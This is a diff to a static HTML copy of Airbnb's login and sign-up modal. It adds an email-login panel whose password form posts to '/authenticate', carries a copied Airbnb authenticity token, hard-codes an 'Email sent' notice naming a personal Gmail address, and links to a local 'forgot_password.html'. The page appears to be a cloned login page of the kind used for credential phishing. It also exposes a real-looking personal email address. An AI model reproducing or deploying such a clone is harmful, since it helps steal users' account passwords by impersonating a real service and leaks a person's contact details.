@@ -1289,6 +1289,7 @@
                                       <div class="_1n35162">
                                         <button
                                           data-testid="signup-login-submit-btn"
+                                          data-id="confirm-number"
                                           type="submit"
                                           class="_6hkhatt"
                                           data-veloute="submit-btn-cypress"
@@ -2054,7 +2055,7 @@
                             <div id="more-options" class="_1y9y8er hidden">
                             <header id="panel-header" data-testid="panel-header" class="_fmle54"><button
                                 data-testid="panel-header-button" aria-label="Back" role="button" type="button"
-                                class="_u1thwpg"><svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"
+                                class="account-container-mb__menu-btn"><svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"
                                   aria-hidden="true" role="presentation" focusable="false"
                                   style="display: block; fill: none; height: 16px; width: 16px; stroke: currentcolor; stroke-width: 3; overflow: visible;">
                                   <g fill="none">
@@ -2184,7 +2185,132 @@
                                   type="submit" class="btn-dark w-full">Resend code</button>
                               </div>
                             </div>
-                          </div>
+                            </div>
+                            <div id="email-login" class="_1y9y8er hidden">
+                              <header id="panel-header" data-testid="panel-header" class="_fmle54"><button
+                                  data-testid="panel-header-button" aria-label="Back" role="button" type="button"
+                                  class="account-container-mb__menu-btn"><svg viewBox="0 0 32 32"
+                                    xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="presentation"
+                                    focusable="false"
+                                    style="display: block; fill: none; height: 16px; width: 16px; stroke: currentcolor; stroke-width: 3; overflow: visible;">
+                                    <g fill="none">
+                                      <path
+                                        d="m20 28-11.29289322-11.2928932c-.39052429-.3905243-.39052429-1.0236893 0-1.4142136l11.29289322-11.2928932">
+                                      </path>
+                                    </g>
+                                  </svg></button>
+                                <section>
+                                  <h2 tabindex="-1" class="_14i3z6h" elementtiming="LCP-target">
+                                    <div class="_1tpjx2u">Log in</div>
+                                  </h2>
+                                </section>
+                                <div class="_2ftibv"></div>
+                              </header>
+                              <div class="_7lvai1" aria-labelledby="panel-header">
+                                <div data-testid="login-pane">
+                                  <div class="_1mgee70">
+                                    <form action="/authenticate" method="POST" novalidate="" data-testid="auth-form">
+                                      <input type="hidden" name="authenticity_token"
+                                        value="V4$.airbnb.com$h9wEdlWpWFY$9FY6YPDG-paYH_6LhSHJnXS_WyCpOvzJNBLG_sgWer8=">
+                                      <div class="mb-6">
+                                        <section role="status" class="e1rue1xl i144hzgs dir dir-ltr">
+                                          <div class="ccmqn89 dir dir-ltr">
+                                            <div class="c1mzlq0d dir dir-ltr"><svg viewBox="0 0 16 16"
+                                                xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="presentation"
+                                                focusable="false"
+                                                style="display: block; height: 16px; width: 16px; fill: currentcolor;">
+                                                <path
+                                                  d="m8 12c1.1045695 0 2 .8954305 2 2s-.8954305 2-2 2-2-.8954305-2-2 .8954305-2 2-2zm1.6-12v9.6h-3.2v-9.6z">
+                                                </path>
+                                              </svg></div>
+                                          </div>
+                                          <div class="mbv7i5o dir dir-ltr">
+                                            <h1 tabindex="-1" class="_14i3z6h" elementtiming="LCP-target">
+                                              <div class="hk7fm8a dir dir-ltr">Let's try that again</div>
+                                            </h1>
+                                            <div class="m1g17ezz h1q6ioub dir dir-ltr">The password you entered is
+                                              incorrect. Try again, or choose another login option.</div>
+                                          </div>
+                                        </section>
+                                      </div>
+                                      <div class="_2lpeup5" role="alert">
+                                        <div class="_dn1bj5">
+                                          <div class="_15umbdc">Email sent</div>
+                                          <div class="_lopxyt">Check your email! We sent a link to
+                                            <strong>ramirezjoseangelo@gmail.com</strong> to help you log in instantly.
+                                          </div>
+                                        </div>
+                                      </div>
+                                      <input type="hidden" name="from" value="email_login"><input type="hidden"
+                                        name="airlock_id" value=""><input type="hidden" name="redirect_url" value="/">
+                                      <div>
+                                        <div class="_1jj61m9"><label class="_1yw7hpv" for="email-signup-password">
+                                            <div class="_1jn0ze9">
+                                              <div class="_11hx67x">Password</div>
+                                            </div>
+                                            <div dir="ltr">
+                                              <div class="_js9i23"><input name="user[password]" placeholder="Password"
+                                                  autocapitalize="none" spellcheck="false"
+                                                  data-testid="email-signup-password" aria-required="true" class="form__input"
+                                                  id="email-signup-password" autocomplete="off" type="password"
+                                                  aria-describedby="email-signup-password-InputField-help" value=""></div>
+                                            </div>
+                                          </label>
+                                          <div class="_129y4gf">
+                                            <div class="_slm4k1"><button type="button"
+                                                class="btn-link-condensed">Show</button>
+                                            </div>
+                                          </div>
+                                        </div>
+                                        <div class="place__recommended-no"></div>
+                                      </div>
+                                      <div>
+                                        <div class="_k8r05be"><label class="_1yw7hpv" for="email-signup-password">
+                                            <div class="_475dd78">
+                                              <div class="_11hx67x">Password</div>
+                                            </div>
+                                            <div dir="ltr">
+                                              <div class="_usmffxk"><input name="user[password]" placeholder="Password"
+                                                  autocapitalize="none" spellcheck="false"
+                                                  data-testid="email-signup-password" aria-required="true"
+                                                  class="form__input" id="email-signup-password" autocomplete="off"
+                                                  type="password" aria-describedby="email-signup-password-InputField-help"
+                                                  value="12a" aria-invalid="true"></div>
+                                            </div>
+                                          </label>
+                                          <div class="_129y4gf">
+                                            <div class="_slm4k1"><button type="button"
+                                                class="btn-link-condensed">Show</button>
+                                            </div>
+                                          </div>
+                                        </div>
+                                        <div class="place__recommended-no">
+                                          <div class="products-container__alert-warning-date-text" id="email-signup-password-InputField-help"
+                                            data-testid="email-signup-password-InputField-help-error"><span
+                                              style="margin-right: 4px;"><svg viewBox="0 0 16 16"
+                                                xmlns="http://www.w3.org/2000/svg" aria-label="Error" role="img"
+                                                focusable="false"
+                                                style="display: block; height: 16px; width: 16px; fill: currentcolor;">
+                                                <path
+                                                  d="M8 0a8 8 0 1 1 0 16A8 8 0 0 1 8 0zm0 10.2a1 1 0 1 0 0 2 1 1 0 0 0 0-2zm.8-6.6H7.2v5.2h1.6z">
+                                                </path>
+                                              </svg></span>Your password must be at least 8 characters. Please try again.
+                                          </div>
+                                        </div>
+                                      </div>
+                                      <div id="airlock-inline-container" aria-live="polite"></div>
+                                      <div class="_wfo3ii"><button data-testid="signup-login-submit-btn" type="submit"
+                                          class="_6hkhatt" data-veloute="submit-btn-cypress"><span class="_jxxpcd"><span
+                                              class="_kaq6tx"
+                                              style="background-position: calc((100 - var(--mouse-x, 0)) * 1%) calc((100 - var(--mouse-y, 0)) * 1%); --mouse-x:58.1026; --mouse-y:30.8632;"></span></span><span
+                                            class="_tcp689">Log in </span></button></div><a
+                                        data-testid="forgot-password-link" href="/forgot_password.html"
+                                        class="text-link">Forgot password?</a>
+                                    </form>
+                                  </div>
+                                </div>
+                              </div>
+                            </div>
                             <div id="finish-signup" class="_1y9y8er hidden">
                               <header
                                 id="panel-header"
@@ -4991,7 +5117,7 @@
                               </div>
                             </div>
                           </div>
-                          <div id="confirm-number" class=" _1y9y8er hidden">
+                          <div id="confirm-number" class="_1y9y8er hidden">
                             <header
                               id="panel-header"
                               data-testid="panel-header"
@@ -5315,7 +5441,7 @@
                           <div id="more-options" class="_1y9y8er hidden">
                             <header id="panel-header" data-testid="panel-header" class="_fmle54"><button
                                 data-testid="panel-header-button" aria-label="Back" role="button" type="button"
-                                class="_u1thwpg"><svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"
+                                class="account-container-mb__menu-btn"><svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"
                                   aria-hidden="true" role="presentation" focusable="false"
                                   style="display: block; fill: none; height: 16px; width: 16px; stroke: currentcolor; stroke-width: 3; overflow: visible;">
                                   <g fill="none">
@@ -5449,7 +5575,7 @@
                           <div id="email-login" class="_1y9y8er hidden">
                             <header id="panel-header" data-testid="panel-header" class="_fmle54"><button
                                 data-testid="panel-header-button" aria-label="Back" role="button" type="button"
-                                class="_u1thwpg"><svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"
+                                class="account-container-mb__menu-btn"><svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg"
                                   aria-hidden="true" role="presentation" focusable="false"
                                   style="display: block; fill: none; height: 16px; width: 16px; stroke: currentcolor; stroke-width: 3; overflow: visible;">
                                   <g fill="none">
@@ -5510,7 +5636,7 @@
                                           <div dir="ltr">
                                             <div class="_js9i23"><input name="user[password]" placeholder="Password"
                                                 autocapitalize="none" spellcheck="false"
-                                                data-testid="email-signup-password" aria-required="true" class="_c5rhl5"
+                                                data-testid="email-signup-password" aria-required="true" class="form__input"
                                                 id="email-signup-password" autocomplete="off" type="password"
                                                 aria-describedby="email-signup-password-InputField-help" value=""></div>
                                           </div>
@@ -5520,7 +5646,7 @@
                                           </div>
                                         </div>
                                       </div>
-                                      <div class="_klarpw"></div>
+                                      <div class="place__recommended-no"></div>
                                     </div>
                                     <div>
                                       <div class="_k8r05be"><label class="_1yw7hpv" for="email-signup-password">
@@ -5541,8 +5667,8 @@
                                           </div>
                                         </div>
                                       </div>
-                                      <div class="_klarpw">
-                                        <div class="_1yhfti2" id="email-signup-password-InputField-help"
+                                      <div class="place__recommended-no">
+                                        <div class="products-container__alert-warning-date-text" id="email-signup-password-InputField-help"
                                           data-testid="email-signup-password-InputField-help-error"><span
                                             style="margin-right: 4px;"><svg viewBox="0 0 16 16"
                                               xmlns="http://www.w3.org/2000/svg" aria-label="Error" role="img"
